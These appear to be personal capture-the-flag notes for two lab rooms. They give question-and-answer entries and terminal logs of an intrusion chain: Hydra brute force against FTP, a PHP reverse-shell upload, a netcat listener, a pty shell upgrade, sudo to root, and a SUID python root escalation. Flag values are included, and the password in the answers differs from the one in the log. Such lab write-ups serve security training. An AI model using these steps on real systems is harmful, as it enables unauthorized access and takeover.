```

It seems like our machine got hacked by an anonymous threat actor. However, we are lucky to have a .pcap file from the attack. Can you determine what happened? Download the .pcap file and use Wireshark to view it.

follow tcp port 21 (wireshark)

The attacker is trying to log into a specific service. What service is this?
FTP
There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool? 
HYDRA
The attacker is trying to log on with a specific username. What is the username?
JENNY

What is the user's password?
password123

What is the current FTP working directory after the attacker logged in?
/var/www/html

The attacker uploaded a backdoor. What is the backdoor's filename?
shell.php


The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL?
http://pentestmonkey.net/tools/php-reverse-shell

Which command did the attacker manually execute after getting a reverse shell?
whoami

What is the computer's hostname? 
wir3

Which command did the attacker execute to spawn a new TTY shell?
python3 -c 'import pty; pty.spawn("/bin/bash")'


Which command was executed to gain a root shell?
sudo su


The attacker downloaded something from GitHub. What is the name of the GitHub project?
Reptile

The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called?
rootkit

Un rootkit es un paquete de software malicioso que está diseñado para permanecer oculto en un ordenador mientras proporciona acceso y control remotos. Los ciberdelincuentes los utilizan para manipular el equipo sin el conocimiento o consentimiento del usuario.


***flag.txt***

┌──(kali㉿kali)-[~/Downloads/hacked]
└─$ hydra -l jenny -P /usr/share/wordlists/rockyou.txt 10.10.90.116 ftp
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-07 19:14:13
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.90.116:21/
[21][ftp] host: 10.10.90.116   login: jenny   password: 987654321
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-07 19:14:56
                                                                                   
┌──(kali㉿kali)-[~/Downloads/hacked]
└─$ ftp 10.10.90.116 
Connected to 10.10.90.116.
220 Hello FTP World!
Name (10.10.90.116:kali): jenny
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||30272|)
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000        10918 Feb 01  2021 index.html
-rwxrwxrwx    1 1000     1000         5493 Feb 01  2021 shell.php
226 Directory send OK.
ftp> 
ftp> put shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||34740|)
150 Ok to send data.
100% |*****************************************|  5489       44.36 MiB/s    00:00 ETA
226 Transfer complete.
5489 bytes sent in 00:00 (8.86 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||36853|)
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000        10918 Feb 01  2021 index.html
-rwxrwxrwx    1 1000     1000         5489 Aug 07 23:18 shell.php
ftp> chmod 777 shell.php
200 SITE CHMOD command ok.

go to http://10.10.90.116/shell.php and listen 

┌──(kali㉿kali)-[~/Downloads/hacked]
└─$ rlwrap nc -nlvp 4444               
listening on [any] 4444 ...
connect to [10.18.1.77] from (UNKNOWN) [10.10.90.116] 38426
Linux wir3 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 23:21:07 up 10 min,  0 users,  load average: 0.01, 0.92, 0.87
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
su jenny
su: must be run from a terminal
python3 -c 'import pty;pty.spawn("/bin/bash")'
su jenny
su jenny
987654321

sudo -l
sudo -l
987654321

Matching Defaults entries for jenny on wir3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jenny may run the following commands on wir3:
    (ALL : ALL) ALL
sudo su
sudo su
whoami
whoami
root
root@wir3:/# find / -type d -name Reptile 2>/dev/null
/root/Reptile
cd /root/Reptile
cd /root/Reptile
ls
ls
configs   Kconfig  Makefile  README.md  userland
flag.txt  kernel   output    scripts
cat flag.txt
cat flag.txt
ebcefd66ca4b559d17b440b6e67fd0fd
root@wir3:~/Reptile# 


rootme
find / -type f -name user.txt 2>/dev/null
/var/www/user.txt

To look for the files with SUID permission we can use the command:
find / -type f -user root -perm -4000 2>/dev/null

    #4.1 Search for files with SUID permission, which file is weird?
    Ans: /usr/bin/python

We have the /usr/bin/python with SUID permission, we will try to escalate our privileges.
My first spot is to go to https://gtfobins.github.io/ look for possible privilege escalation commands for elevating the privileges.
Search python in the search bar.


python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
<hon -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami
whoami
root
id
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
cat /root/root.txt
cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}


```

[[Hack_printer]]